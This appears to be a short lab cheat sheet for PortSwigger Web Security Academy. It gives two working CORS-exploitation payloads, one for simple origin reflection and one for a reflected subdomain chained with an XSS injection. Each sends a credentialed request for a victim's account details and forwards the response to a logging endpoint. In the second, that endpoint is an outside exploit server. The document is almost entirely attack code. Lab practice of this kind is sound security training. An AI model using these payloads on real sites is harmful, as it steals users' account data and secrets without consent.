## When simple origin reflection

```javascript
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get', 'YOUR-LAB-ID.web-security-academy.net/accountDetails', true);
req.withCredentials = true;
req.send();

function reqListener() {
    location = '/log?key=' + this.responseText;
};
</script>
```
## When Access-Control-Allow-Origin reflected subdomain
```
<script>
document.location = "http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get', 'https://YOUR-LAB-ID.web-security-academy.net/accountDetails', true); req.withCredentials = true; req.send(); function reqListener() { location = 'https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key=' + this.responseText; };%3c/script>&storeId=1"
</script>
```
